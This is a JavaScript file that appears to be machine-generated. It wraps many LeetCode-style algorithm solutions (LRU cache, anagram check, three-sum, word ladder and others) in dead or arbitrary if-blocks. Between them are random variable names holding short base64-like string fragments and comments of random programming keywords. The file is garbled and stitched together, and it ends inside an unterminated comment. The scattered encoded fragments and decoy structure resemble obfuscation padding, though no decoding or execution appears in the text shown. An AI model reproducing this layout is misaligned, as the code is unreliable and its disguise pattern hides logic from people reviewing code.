    var olxznkoxkdj = 'zAnrs';
if (0.04 && false) {
    /**
Design and implement a data structure for Least Recently Used (LRU) cache. It should support the following operations: get and set.

get(key) - Get the value (will always be positive) of the key if the key exists in the cache, otherwise return -1.
set(key, value) - Set or insert the value if the key is not already present. When the cache reached its capacity, it should invalidate the least recently used item before inserting a new item.
*/
class Node {
    constructor(key, val) {
        this.key = key;
        this.val = val;
        this.next = null;
        this.prev = null;
    }
}
/**
 * @constructor
 */
var LRUCache = function(capacity) {
    this.list = null;
    this.map = new Map();
    this.head = null;
    this.tail = null;
    this.size = capacity;
    this.curSize = 0;
};

/**
 * @param {number} key
 * @returns {number}
 */
LRUCache.prototype.get = function(key) {
    if (!this.map.get(key)) {
        return -1;
    }
    
    let node = this.map.get(key);
    
    if (node === this.head) {
        return node.val;
    }
    
    // remove node from list
    if (node === this.tail) {
        this.tail.prev.next = null;
        this.tail = this.tail.prev;
    } else {
        node.prev.next = node.next;
        node.next.prev = node.prev;
    }
    
    // insert node to head
    node.next = this.head;
    this.head.prev = node;
    this.head = node;
    
    return node.val;
};

/**
 * @param {number} key
 * @param {number} value
 * @returns {void}
 */
LRUCache.prototype.set = function(key, value) {
    let newNode = new Node(key, value);
    
    if (this.curSize === 0) {
        this.head = newNode;
        this.tail = newNode;
        this.curSize++;
    } else {
        newNode.next = this.head;
        this.head.prev = newNode;
        this.head = newNode;
        this.curSize++;
    }
    
    // update
    if (this.map.get(key)) {
        let oldNode = this.map.get(key);
        
        if (oldNode === this.tail) {
            this.tail = this.tail.prev;
            this.tail.next = null;
        } else {
            oldNode.prev.next = oldNode.next;
            oldNode.next.prev = oldNode.prev;
        }
        
        this.curSize--;
        this.map.set(key, newNode);
    } else {
        if (this.curSize > this.size) {
            //delete tail
            this.map.delete(this.tail.key);
            this.tail = this.tail.prev;
            this.tail.next = null;
            this.curSize--;
        }
        
        this.map.set(key, newNode);
    }
};

}

    var rlqsv = 'dWEy';
    var gtvtgcccs = 'ucGpaxAWPv';
// event hello string script define array value object world constant debug
if ('u' === 'B') {
    /**
Follow up for "Unique Paths":

Now consider if some obstacles are added to the grids. How many unique paths would there be?

An obstacle and empty space is marked as 1 and 0 respectively in the grid.

For example,
There is one obstacle in the middle of a 3x3 grid as illustrated below.

[
  [0,0,0],
  [0,1,0],
  [0,0,0]
]
The total number of unique paths is 2.

Note: m and n will be at most 100.


*/
/**
 * @param {number[][]} obstacle
 * @return {number}
 */
var uniquePathsWithObstacles = function(obstacle) {
    var rLen = obstacle.length,
        matrix = [],
        cLen,
        i,
        j;
        
    if (rLen === 0) {
        return 0;    
    }
    
    cLen = obstacle[0].length;
    
    if (obstacle[0][0] === 1) {
        return 0;
    }
    
    for (i = 0; i < rLen; i++) {
        matrix.push(new Array(cLen));
    }
    
    matrix[0][0] = 1;
    for (i = 1; i < cLen; i++) {
        matrix[0][i] = (obstacle[0][i] || !matrix[0][i - 1])? 0 : 1; 
    }
    
    for (i = 1; i < rLen; i++) {
        matrix[i][0] = (obstacle[i][0] || !matrix[i - 1][0])? 0 : 1;
    }
    
    for (i = 1; i < rLen; i++) {
        for (j = 1; j < cLen; j++) {
            if (obstacle[i][j]) {
                matrix[i][j] = 0;
            } else {
                matrix[i][j] = matrix[i - 1][j] + matrix[i][j - 1];
            }
        }
    }
    
    return matrix[rLen - 1][cLen - 1];
};

}

    var kqniydj = 'AscIkktL';
if (null === 2) {
    /**
Find the contiguous subarray within an array (containing at least one number) which has the largest product.

For example, given the array [2,3,-2,4],
the contiguous subarray [2,3] has the largest product = 6.
*/

/**
 * @param {number[]} nums
 * @return {number}
 * 
 * max_product[i] = max(max_product[i-1]*A[i], min_product[i-1]*A[i], A[i]) 
 * min_product[i] = min(max_product[i-1]*A[i], min_product[i-1]*A[i], A[i]) 
 */
var maxProduct = function(nums) {
    var curMax,
        curMin,
        len = nums.length,
        i,
        result,
        temp;
        
    if (len === 0) {
        return 0;
    }
    
    curMax = curMin = result = nums[0];
    
    for (i = 1; i < len; i++) {
        temp = curMax;
        curMax = Math.max(temp * nums[i], curMin * nums[i], nums[i]);
        curMin = Math.min(temp * nums[i], curMin * nums[i], nums[i]);
        
        result = Math.max(result, curMax);
    }
    
    return result;
};

}

    var ufmcgosucwma = 'VjVRMjl';
    var nfptomwuwy = 'sPpUdvH';
// import array ctpn hello value import compile variable code function
    var wxjvnrep = 'RRnfuA';
    var qzmvmx = 'rWlNBOV';
    var bldjlswzosq = 'qIIwyUhyN';
if (26 > 147) {
    /**
Given a range [m, n] where 0 <= m <= n <= 2147483647, return the bitwise AND of all numbers in this range, inclusive.

For example, given the range [5, 7], you should return 4.
*/

/**
 * @param {number} m
 * @param {number} n
 * @return {number}
 */
var rangeBitwiseAnd = function(m, n) {
    var offset = 0;
    
    while (m && n) {
        if (m === n) {
            return m << offset;
        }
        
        m >>= 1;
        n >>= 1;
        offset++;
    }
    
    return 0;
};

}

// return await loop async
    var qcfgeyl = 'ajky';
    var nenonfnmp = 'BUMGdhMlY';
    var aiokpcfa = 'ZBjxj';
if (Array.isArray(4)) {
    /**
Given a string S, you are allowed to convert it to a palindrome by adding characters in front of it. Find and return the shortest palindrome you can find by performing this transformation.

For example:

Given "aacecaaa", return "aaacecaaa".

Given "abcd", return "dcbabcd".
*/

// https://segmentfault.com/a/1190000003059361

/**
 * @param {string} s
 * @return {string}
 */
var shortestPalindrome = function(s) {
    var reverse = s.split('').reverse().join('');
    
    return reverse.substring(0, s.length - getCommonLength(s + '#' + reverse)) + s;
};

function getCommonLength(s) {
    var p = [], // max len of common prefix and suffix from index 0 to i 
        len = s.length,
        i = 0,
        j;
    
    while(i < len) {
        p.push(0);
        i++;
    }
    
    for (i = 1; i < len; i++) {
        j = p[i - 1];
        
        while(j > 0 && (s.charAt(i) !== s.charAt(j))) {
            j = p[j - 1];
        }
        
        if (s.charAt(i) === s.charAt(j)) {
            j++;
        }
        
        p[i] = j; 
    }
    
    return p[len - 1];
}   

}

    var enacvpzy = '1TG';
    var krdvwwyelam = 'jIFlnNn';
    var jszulspa = '10bGVVTnZ';
    var notqpampjumr = 'XzrJMNHL';
if ('t' === 'Y') {
    /**
Given a binary tree, find the lowest common ancestor (LCA) of two given nodes in the tree.

According to the definition of LCA on Wikipedia: “The lowest common ancestor is defined between two nodes v and w as the lowest node in T that has both v and w as descendants (where we allow a node to be a descendant of itself).”

        _______3______
       /              \
    ___5__          ___1__
   /      \        /      \
   6      _2       0       8
         /  \
         7   4
For example, the lowest common ancestor (LCA) of nodes 5 and 1 is 3. Another example is LCA of nodes 5 and 4 is 5, since a node can be a descendant of itself according to the LCA definition.
*/
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @param {TreeNode} p
 * @param {TreeNode} q
 * @return {TreeNode}
 */
var lowestCommonAncestor = function(root, p, q) {
    if (!root || root === p || root === q) {
        return root;
    }
    
    var left = lowestCommonAncestor(root.left, p, q),
        right = lowestCommonAncestor(root.right, p, q);
    
    // q and p in different side    
    if (left && right) {
        return root;
    }
    
    return left ? left : right;
};

}

    var yfqeoq = 'aR1VLSUNB';
    var ylrwmbrek = 'nvrqgB';
    var lndxb = 'Z0lDazdDb';
if (6 instanceof String) {
    /**
Given two strings s and t, write a function to determine if t is an anagram of s.

For example,
s = "anagram", t = "nagaram", return true.
s = "rat", t = "car", return false.

Note:
You may assume the string contains only lowercase alphabets.

Follow up:
What if the inputs contain unicode characters? How would you adapt your solution to such case?
*/

/**
 * @param {string} s
 * @param {string} t
 * @return {boolean}
 */
var isAnagram = function(s, t) {
    var len = s.length,
        arr = {},
        i;
    
    if (t.length !== len) {
        return false;
    }
    
    if (len === 0) {
        return true;
    }
    
    for (i = 0; i < len; i++) {
        if (!arr[s.charAt(i)]) {
            arr[s.charAt(i)] = 1;
        } else {
            arr[s.charAt(i)]++;
        }
    }
    
    for (i = 0; i < len; i++) {
        if (typeof arr[t.charAt(i)] === 'undefined' || --arr[t.charAt(i)] < 0) {
            return false;
        }
    }
    
    return true;
};

}

    var kvveaeykr = 'oDNpyenp';
if (4 instanceof String) {
    /**
Given an absolute path for a file (Unix-style), simplify it.

For example,
path = "/home/", => "/home"
path = "/a/./b/../../c/", => "/c"
click to show corner cases.

Corner Cases:
Did you consider the case where path = "/../"?
In this case, you should return "/".
Another corner case is the path might contain multiple slashes '/' together, such as "/home//foo/".
In this case, you should ignore redundant slashes and return "/home/foo".
*/
/**
 * @param {string} path
 * @return {string}
 */
var simplifyPath = function(path) {
    var paths = [],
        arr = path.split('/'),
        len = arr.length,
        cur,
        i,
        result = '';
        
    for (i = 0; i < len; i++) {
        cur = arr[i];
        
        if (cur === '.' || cur.length === 0) {
            continue;
        }
        
        if (cur === '..') {
            if (paths.length > 0) {
                paths.pop();
            }
        } else {
            paths.push(cur);
        }
    }
    
    for (i = 0; i < paths.length; i++) {
        result += '/' + paths[i];
    }
    
    if (result === '') {
        result = '/';
    }
    
    return result;
};

}

    var yukoy = 'jBLQ2k';
if (5 === 14) {
    /**
Implement an iterator over a binary search tree (BST). Your iterator will be initialized with the root node of a BST.

Calling next() will return the next smallest number in the BST.

Note: next() and hasNext() should run in average O(1) time and uses O(h) memory, where h is the height of the tree.
*/
/**
 * Definition for binary tree
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */

/**
 * @constructor
 * @param {TreeNode} root - root of the binary search tree
 */
var BSTIterator = function(root) {
    this.stack = [];
    
    while (root) {
        this.stack.push(root);
        root = root.left;
    }
};


/**
 * @this BSTIterator
 * @returns {boolean} - whether we have a next smallest number
 */
BSTIterator.prototype.hasNext = function() {
    return this.stack.length > 0;
};

/**
 * @this BSTIterator
 * @returns {number} - the next smallest number
 */
BSTIterator.prototype.next = function() {
    var node = this.stack.pop(),
        result = node.val;
    
    node = node.right;
    while (node) {
        this.stack.push(node);
        node = node.left;
    }
    
    return result;
};

/**
 * Your BSTIterator will be called like this:
 * var i = new BSTIterator(root), a = [];
 * while (i.hasNext()) a.push(i.next());
*/

}

    var iutjymatrm = 'UCXTTT';
// compile define function string world variable async define function define world loop hello export
if ('r' === 'T') {
    /**
Given n non-negative integers representing the histogram's bar height where the width of each bar is 1, find the area of largest rectangle in the histogram.


Above is a histogram where width of each bar is 1, given height = [2,1,5,6,2,3].


The largest rectangle is shown in the shaded area, which has area = 10 unit.

For example,
Given heights = [2,1,5,6,2,3],
return 10.
*/
/**
 * @param {number[]} heights
 * @return {number}
 */
var largestRectangleArea = function(heights) {
    var len = heights.length,
        stack = [],
        max = 0,
        cur,
        i;
    
    if (len === 0) {
        return 0;
    }
    
    heights[len] = 0;
    len++;
    
    for (i = 0; i < len;) {
        if (stack.length > 0 && heights[i] <= heights[stack[stack.length - 1]]) {
            cur = stack.pop();
            // 如果栈已经为空，说明到目前为止所有元素（当前下标元素除外）都比出栈元素高度要大（否则栈中肯定还有元素），所以矩阵面积就是高度乘以当前下标i。
            // 如果栈不为空，那么就是从当前栈顶元素的下一个到当前下标的元素之前都比出栈元素高度大（因为栈顶元素第一个比当前出栈元素小的）。
            max = Math.max(max, heights[cur] * (stack.length === 0 ? i : i - stack[stack.length - 1] - 1));
            continue;
        }
        
        stack.push(i);
        i++;
    }
    
    return max;
};

}

    var ckusxyndas = 'ZvcYp';
    var umdfymrgnyseyxp = '4dklGQnlaW';
    var xuopoaidbc = 'Lkvbu';
// object
if (typeof window === 'undefined') {
    /**
Count the number of prime numbers less than a non-negative number, n

 * @param {number} n
 * @return {number}
 */
var countPrimes = function(n) {
    var i,
        j,
        result = 0,
        prime;
    if (n === 1) {
        return 0;
    }
    for (i = 2; i < n; i++) {
        prime = true;
        for (j = 2; j*j <= i; j++) {
            if (i%j === 0) {
                prime = false;
                break;
            }
        }
        if (prime) {
            result++;
        }
    }
    return result;
};

}

    var tlskuutd = 'hQBdKPgqK';
    var hihqw = 'FpsYm5Sek';
    var lsloxrmto = 'Bhnnues';
// array bbhzrit export world async event constant return export pkwnho export define value event
    var eqxokabj = 'JRYuLCXQAP';
    var pdslwsziuzbju = 'lISn';
    var opsnwrk = 'oeTiA';
if ('o' === 'P') {
    /**
Sort a linked list in O(n log n) time using constant space complexity.
*/
/**
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */
/**
 * @param {ListNode} head
 * @return {ListNode}
 */
var sortList = function(head) {
    var slow = head,
        fast = head,
        head1 = head,
        head2 = head;
    
    if (head === null || head.next === null) {
        return head;
    }
    
    while (fast.next !== null && fast.next.next !== null) {
        slow = slow.next;
        fast = fast.next.next;
    }
    
    head1 = slow.next;
    slow.next = null;
    
    head1 = sortList(head1);
    head2 = sortList(head);
    
    return merge(head2, head1);
};

function merge(a, b) {
    var dummy = new ListNode(0),
        node = dummy;
        
    while (a && b) {
        if (a.val < b.val) {
            node.next = a;
            a = a.next;
        } else {
            node.next = b;
            b = b.next;
        }
        node = node.next;
    }
    
    if (a) {
        node.next = a;
    } else {
        node.next = b;
    }
    
    return dummy.next;
}

}

    var xphfcf = 'BaMmgwTFd';
if (!true && 0) {
    /**
Given a linked list, swap every two adjacent nodes and return its head.

For example,
Given 1->2->3->4, you should return the list as 2->1->4->3.

Your algorithm should use only constant space. You may not modify the values in the list, only nodes itself can be changed.
*/

/**
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */
/**
 * @param {ListNode} head
 * @return {ListNode}
 */
var swapPairs = function(head) {
    if (head === null) {
        return null;
    }
    
    var next = head.next,
        result = next? next : head,
        prevTail,
        curHead,
        nextHead;
    
    curHead = head;

    while(next) {
        nextHead = next.next;
        
        if (prevTail) {
            prevTail.next = next;
        }
        
        next.next = curHead;
        curHead.next = nextHead;
        prevTail = curHead;
        
        curHead = nextHead;
        next = curHead && curHead.next;
    }
    
    return result;
};

}

    var lyydnq = 'BwQqQn';
    var phahpfg = 'Oc2FXTn';
if (null === 4) {
    
/**
 * Given an array of integers, every element appears twice except for one. Find that single one.
 * Note:
 * Your algorithm should have a linear runtime complexity. Could you implement it without using extra memory?
 * 
 * @param {number[]} A
 * @return {number}
 */
var singleNumber = function(A) {
    var length = A.length,
        i,
        result = 0;
    if (length === 1) {
        return A[0];
    }
    for (i = 0; i < length; i++) {
        result = result ^ A[i];
    }
    return result;
};

}

    var tmpxaop = 'iYHALjeGAE';
// array debug async code import function code variable import compile
if (typeof window === 'undefined') {
    /**
Given a binary tree, return all root-to-leaf paths.

For example, given the following binary tree:

   1
 /   \
2     3
 \
  5
All root-to-leaf paths are:

["1->2->5", "1->3"]
*/

/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @return {string[]}
 */
var binaryTreePaths = function(root) {
    var result = [];
    
    getPaths(root, null, result);
    
    return result;
};

function getPaths(node, curStr, result) {
    if (node === null) {
        return;
    }
    
    if (!curStr) {
        curStr = '' + node.val;
    } else {
        curStr += '->' + node.val;
    }
    
    if (node.left) {
        getPaths(node.left, curStr, result);
    }
    
    if (node.right) {
        getPaths(node.right, curStr, result);
    }
    
    if (!node.left && !node.right) {
        result.push(curStr);
    }
}

}

    var mjbttrbwxzsu = 'fAvBEFNIMv';
    var iehvwbqw = 'JJSFJ2SUd';
    var gadzhugkfw = 'jDaPkUhw';
// hello define variable
    var sytvxwxqiyb = 'blVa';
    var ahdwmptqbyjpe = 'ScGMyRm';
    var iiphzvigdusf = 'PjvPn';
    var toewszkonqw = 'liR1VnWTI';
    var zgjslkaf = 'IsdvujuoOz';
    var vgansgrbqon = '5dWRHVjRk';
if (Array.isArray(2)) {
    /**
Given two words (beginWord and endWord), and a dictionary's word list, find the length of shortest transformation sequence from beginWord to endWord, such that:

Only one letter can be changed at a time
Each intermediate word must exist in the word list
For example,

Given:
beginWord = "hit"
endWord = "cog"
wordList = ["hot","dot","dog","lot","log"]
As one shortest transformation is "hit" -> "hot" -> "dot" -> "dog" -> "cog",
return its length 5.

Note:
Return 0 if there is no such transformation sequence.
All words have the same length.
All words contain only lowercase alphabetic characters.
*/
/**
 * @param {string} beginWord
 * @param {string} endWord
 * @param {Set} wordList
 *   Note: wordList is a Set object, see:
 *   https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Set
 * @return {number}
 */
var ladderLength = function(beginWord, endWord, wordList) {
    var visit = {},
        len = beginWord.length,
        queue = [],
        charArr = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'],
        curNode,
        curStr,
        tempStr,
        tempNode,
        i,
        j;
    
    curNode = new node(beginWord, 1);
    visit[curNode.str] = true;
    queue.push(curNode);
    

    while (queue.length > 0) {
        curNode = queue.shift();
        curStr = curNode.str;
        for (i = 0; i < len; i++) {
            for (j = 0; j < 26; j++) {
                if (charArr[j] === curStr.charAt(i)) {
                    continue;
                }
                
                tempStr = curStr.substring(0, i) + charArr[j] + curStr.substring(i + 1, len);
                
                if (tempStr === endWord) {
                    return curNode.step + 1;
                }
                
                if (wordList.has(tempStr) && !visit.hasOwnProperty(tempStr)) {
                    visit[tempStr] = true;
                    tempNode = new node(tempStr, curNode.step + 1);
                    queue.push(tempNode);
                }
            }
        }
    }
        
    return 0;
};

function node(str, step) {
    this.str = str;
    this.step = step;
}

}

    var qcxrxj = 'yzNnHmWk';
// script wnedagi variable object constant number object object
if (Array.isArray(5)) {
    /**
Find the contiguous subarray within an array (containing at least one number) which has the largest sum.

For example, given the array [−2,1,−3,4,−1,2,1,−5,4],
the contiguous subarray [4,−1,2,1] has the largest sum = 6.
*/

/**
 * @param {number[]} nums
 * @return {number}
 */
var maxSubArray = function(nums) {
    var sum = 0,
        max = Number.NEGATIVE_INFINITY,
        len = nums.length,
        i;
        
    for (i = 0; i < len; i++) {
        sum += nums[i];
        
        max = Math.max(sum, max);
        
        if (sum < 0) {
            sum = 0;
        }
    }
    
    return max;
};


// divide and conquer

/**
 * @param {number[]} nums
 * @return {number}
 */
var maxSubArray = function(nums) {
    return helper(0, nums.length - 1, nums);
};

function helper(start, end, arr) {
    if (start > end) {
        return Number.NEGATIVE_INFINITY;
    }
    
    if (start === end) {
        return arr[start];
    }
    
    var mid = Math.floor((start + end) / 2),
        leftMax = Number.NEGATIVE_INFINITY,
        rightMax = Number.NEGATIVE_INFINITY,
        midMax,
        i,
        curSum;
    
    for (i = mid - 1, curSum = 0; i >= start; i--) {
        curSum += arr[i];
        leftMax = Math.max(curSum, leftMax);
    }
    
    for (i = mid + 1, curSum = 0; i <= end; i++) {
        curSum += arr[i];
        rightMax = Math.max(curSum, rightMax);
    }
    
    midMax = arr[mid] + Math.max(leftMax, 0) + Math.max(rightMax, 0);
    
    return Math.max(midMax, helper(start, mid - 1, arr), helper(mid + 1, end, arr));
}

}

    var peloilfygx = 'DfebDT';
if (Array.isArray(10)) {
    /**
A strobogrammatic number is a number that looks the same when rotated 180 degrees (looked at upside down).

Write a function to determine if a number is strobogrammatic. The number is represented as a string.

For example, the numbers "69", "88", and "818" are all strobogrammatic.
*/
/**
 * @param {string} num
 * @return {boolean}
 */
var isStrobogrammatic = function(num) {
    let map = new Map();
    
    map.set('1', '1');
    map.set('6', '9');
    map.set('9', '6');
    map.set('8', '8');
    map.set('0', '0');
    
    let start = 0;
    let end = num.length - 1;
    
    while (start <= end) {
        if (!map.has(num.charAt(start)) || map.get(num.charAt(start)) !== num.charAt(end)) {
            return false;
        }
        
        start++;
        end--;
    }
    
    return true;
};

}

    var hvtoytbx = 'Q0J0Wlc1';
if (!true && 1) {
    /**
 * @param {number} n
 * @return {number}
 */
var numTrees = function(n) {
    var i,
        j,
        result = [];
    
    result[0] = 1;
    result[1] = 1;
    
    for (i = 2; i <= n; i++) {
        result[i] = 0;
        for (j = 0; j < i; j++) {
            result[i] += result[j] * result[i - 1 - j];
        }
        
    }
    return result[n];
};

}

    var pjmwpul = 'iwLIy';
if (typeof window === 'undefined') {
    /**
Evaluate the value of an arithmetic expression in Reverse Polish Notation.

Valid operators are +, -, *, /. Each operand may be an integer or another expression.

Some examples:
  ["2", "1", "+", "3", "*"] -> ((2 + 1) * 3) -> 9
  ["4", "13", "5", "/", "+"] -> (4 + (13 / 5)) -> 6
Subscribe to see which companies asked this question
*/
/**
 * @param {string[]} tokens
 * @return {number}
 */
var evalRPN = function(tokens) {
    var stack = [],
        len = tokens.length,
        ch,
        num,
        i;
        
    for (i = 0; i < len; i++) {
        ch = tokens[i];
        
        if (isNaN(parseInt(ch))) {
            if (ch === '+') {
                num = stack.pop() + stack.pop();
                stack.push(num);
            } else if (ch === '-') {
                num = stack.pop();
                num = stack.pop() - num;
                stack.push(num);
            } else if (ch === '*') {
                num = stack.pop() * stack.pop();
                stack.push(num);
            } else if (ch === '/') {
                num = stack.pop();
                num = parseInt(stack.pop() / num);
                stack.push(num);
            }
        } else {
            stack.push(parseInt(ch));
        }
    }
    
    return stack.pop();
};

}

    var ifhcqpfbstrh = 'MUxncGt';
if (Array.isArray(9)) {
    /**
Given a collection of distinct numbers, return all possible permutations.

For example,
[1,2,3] have the following permutations:
[1,2,3], [1,3,2], [2,1,3], [2,3,1], [3,1,2], and [3,2,1].
*/

/**
 * @param {number[]} nums
 * @return {number[][]}
 */
var permute = function(nums) {
    function getPerm(arr, numss, n) {
        var len = arr.length,
            result = [],
            len1,
            x,
            copy,
            i,
            j;
        
        if (n === numss.length) {
            return arr;
        }
        
        x = numss[n];
        len1 = arr[0].length;
        
        for (i = 0; i < len; i++) {
            for (j = 0; j <= len1; j++) {
                copy = arr[i].slice(0);
                copy.splice(j, 0, x);
                result.push(copy);
            }
        }
        
        return getPerm(result, numss, n + 1);
    }
    var initArr = [],
        initElement = [];
    
    initArr.push(initElement);
    return getPerm(initArr, nums, 0);
    
};

// SOLUTION 2, recursion with an array store used
/**
 * @param {number[]} nums
 * @return {number[][]}
 */
var permute = function(nums) {
        var len = nums.length,
        result = [];
    
    genPerm(result, 0, len, [], [], nums);
    
    return result;
};

function genPerm(result, index, len, curArr, used, nums) {
    if (curArr.length === len) {
        result.push(curArr);
        return;
    }
    
    var i;
    
    for (i = 0; i < len; i++) {
        if (used[i]) {
            continue;
        }
        
        curArr.push(nums[i]);
        used[i] = true;
        genPerm(result, i + 1, len, curArr.concat(), used.concat(), nums);
        used[i] = false;
        curArr.pop();
    }
}

}

    var mvgeab = 'QYNznSMreV';
if (41 > 183) {
    /**
Implement the following operations of a stack using queues.

push(x) -- Push element x onto stack.
pop() -- Removes the element on top of the stack.
top() -- Get the top element.
empty() -- Return whether the stack is empty.
Notes:
You must use only standard operations of a queue -- which means only push to back, peek/pop from front, size, and is empty operations are valid.
Depending on your language, queue may not be supported natively. You may simulate a queue by using a list or deque (double-ended queue), as long as you use only standard operations of a queue.
You may assume that all operations are valid (for example, no pop or top operations will be called on an empty stack).
Update (2015-06-11):
The class name of the Java function had been updated to MyStack instead of Stack.


*/

/**
 * @constructor
 */
var Stack = function() {
    this.stack1 = [];
    this.stack2 = [];
};

/**
 * @param {number} x
 * @returns {void}
 */
Stack.prototype.push = function(x) {
    var temp;
    
    this.stack2.push(x);
    
    while(this.stack1.length > 0) {
        this.stack2.push(this.stack1.shift());
    }
    
    temp = this.stack2;
    this.stack2 = this.stack1;
    this.stack1 = temp;
};

/**
 * @returns {void}
 */
Stack.prototype.pop = function() {
    return this.stack1.shift();
};

/**
 * @returns {number}
 */
Stack.prototype.top = function() {
    return this.stack1[0];
};

/**
 * @returns {boolean}
 */
Stack.prototype.empty = function() {
    return this.stack1.length === 0;
};

}

    var apxjijyzhmrf = 'iMk4';
    var fxgcvqi = 'wSCSvFw';
    var pvmfrhemskqmkg = 'xYldWdWRD';
if ('w' === 'A') {
    /**
Given an array of non-negative integers, you are initially positioned at the first index of the array.

Each element in the array represents your maximum jump length at that position.

Your goal is to reach the last index in the minimum number of jumps.

For example:
Given array A = [2,3,1,1,4]

The minimum number of jumps to reach the last index is 2. (Jump 1 step from index 0 to 1, then 3 steps to the last index.)

Note:
You can assume that you can always reach the last index.
*/
/**
 * @param {number[]} nums
 * @return {number}
 */
var jump = function(nums) {
    var len = nums.length,
        step = 0,
        last = 0,
        cover = nums[0],
        i;
    
    for (i = 1; i < len; i++) {
        if (i > last) {
            last = cover;
            step++;
        }
        
        if (last >= len - 1) {
            break;
        }
        
        cover = Math.max(cover, nums[i] + i);
    }
    
    return step;
};


// time limit exceeded
/**
 * @param {number[]} nums
 * @return {number}
 */
var jump = function(nums) {
    var len = nums.length,
        result = [];
        
    result[0] = Number.MAX_VALUE;
    helper(0, nums, 0, 0, result);
    
    return result[0];
};

function helper(index, nums, cover, step, result) {
    if (cover < index || step > result[0]) {
        return;
    }
    
    if (cover >= nums.length - 1) {
        result[0] = Math.min(result[0], step);
        return;
    }
    
    var i = index;
    
    for (i = index; i <= cover; i++) {
        helper(i + 1, nums, Math.max(cover, nums[i] + i), step + 1, result);
    }
}


// memory limit exceed
/**
 * @param {number[]} nums
 * @return {number}
 */
var jump = function(nums) {
    var len = nums.length,
        dp = [],
        result = Number.MAX_VALUE,
        reachable = [],
        i,
        j;
    
    for (j = 0; j < len; j++) {
        reachable.push(new Array(len));
        for (i = j + 1; i < len; i++) {
            if (nums[j] + j >= i) {
                reachable[j][i] = true;
            } else {
                break;
            }
        }
    }
    dp[0] = 1;
    for (i = 1; i < len; i++) {
        // since there's always a solution
        dp[i] = dp[i - 1] + 1;
        
        for (j = 0; j < i; j++) {
            if (reachable[j][i]) {
                dp[i] = Math.min(dp[i], dp[j] + 1);
            }
        }
    }
    
    return dp[len - 1];
};

}

    var ytmmdryqr = 'QLETZqh';
if (15 > 161) {
    /**
Given a binary tree containing digits from 0-9 only, each root-to-leaf path could represent a number.

An example is the root-to-leaf path 1->2->3 which represents the number 123.

Find the total sum of all root-to-leaf numbers.

For example,

    1
   / \
  2   3
The root-to-leaf path 1->2 represents the number 12.
The root-to-leaf path 1->3 represents the number 13.

Return the sum = 12 + 13 = 25.
*/
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @return {number}
 */
var sumNumbers = function(root) {
    var arr = [0];
    
    helper(root, 0, arr);
    
    return arr[0];
};

function helper(node, sum, arr) {
    if (!node) {
        return;
    }
    
    sum = sum*10 + node.val;
    
    if (!node.left && !node.right) {
        arr[0] += sum;
        return;
    }
    
    if (node.left) {
        helper(node.left, sum, arr);
    }
    
    if (node.right) {
        helper(node.right, sum, arr);
    }
    
}

}

    var sqpmeavma = 'NWhaR1JGZG';
if (typeof navigator === 'undefined') {
    /**
Given an array S of n integers, are there elements a, b, c in S such that a + b + c = 0? Find all unique triplets in the array which gives the sum of zero.

Note:
Elements in a triplet (a,b,c) must be in non-descending order. (ie, a ≤ b ≤ c)
The solution set must not contain duplicate triplets.
    For example, given array S = {-1 0 1 2 -1 -4},

    A solution set is:
    (-1, 0, 1)
    (-1, -1, 2)

*/
/**
 * @param {number[]} nums
 * @return {number[][]}
 */
var threeSum = function(nums) {
    nums.sort(function(a, b) {
        return a - b;
    });
    
    var len = nums.length,
        i,
        result = [],
        curSol = [];
        
    for (i = 0; i < len; i++) {
        if (i > 0 && nums[i] === nums[i - 1]) {
            continue;
        } 
        
        curSol.push(nums[i]);
        twoSum(result, curSol.concat(), i + 1, len - 1, -nums[i], nums);
        curSol.pop();
    }
    
    return result;
};

function twoSum(allSol, curSol, startIndex, endIndex, target, nums) {
    var start = startIndex,
        end = endIndex,
        sum,
        mid;
    
    while (start < end) {
       sum = nums[start] + nums[end];
       
       if (sum === target) {
           curSol.push(nums[start]);
           curSol.push(nums[end]);
           allSol.push(curSol.concat());
           curSol.pop();
           curSol.pop();
           
           start++;
           end--;
           
           while (nums[start] === nums[start - 1]) {
               start++;
           }
           
           while (nums[end] === nums[end + 1]) {
               end--;
           }
       } else if (sum < target) {
           start++;
       } else {
           end--;
       }
    }
}

}

    var kszsoi = 'ThtidbOWot';
if ('true' === true) {
    /**
Given a string S, find the longest palindromic substring in S. You may assume that the maximum length of S is 1000, and there exists one unique longest palindromic substring.

*/
// MEMORY LIMIT EXCEEDED....
/**
 * @param {string} s
 * @return {string}
 */
var longestPalindrome = function(s) {
    var len = s.length,
        isPal = [],
        max = 1,
        start = 0,
        end = 0,
        i,
        j;
    
    for (i = 0; i < len; i++) {
        isPal.push(new Array(len));
        isPal[i][i] = true;
    }
    
    for (i = len - 1; i >= 0; i--) {
        for (j = i + 1; j < len; j++) {
            if (s.charAt(i) === s.charAt(j) && (j === i + 1 || isPal[i + 1][j - 1])) {
                isPal[i][j] = true;
                
                if (j - i + 1 > max) {
                    start = i;
                    end = j;
                    max = j - i + 1;
                }
            }
        }
    }
    
    return s.substring(start, end + 1);
};

}

    var sxsnyftlehharl = '1WdWRFeHBj';
if ('true' === true) {
    /**
Given a list of airline tickets represented by pairs of departure and arrival airports [from, to], reconstruct the itinerary in order. All of the tickets belong to a man who departs from JFK. Thus, the itinerary must begin with JFK.

Note:
If there are multiple valid itineraries, you should return the itinerary that has the smallest lexical order when read as a single string. For example, the itinerary ["JFK", "LGA"] has a smaller lexical order than ["JFK", "LGB"].
All airports are represented by three capital letters (IATA code).
You may assume all tickets form at least one valid itinerary.
Example 1:
tickets = [["MUC", "LHR"], ["JFK", "MUC"], ["SFO", "SJC"], ["LHR", "SFO"]]
Return ["JFK", "MUC", "LHR", "SFO", "SJC"].
Example 2:
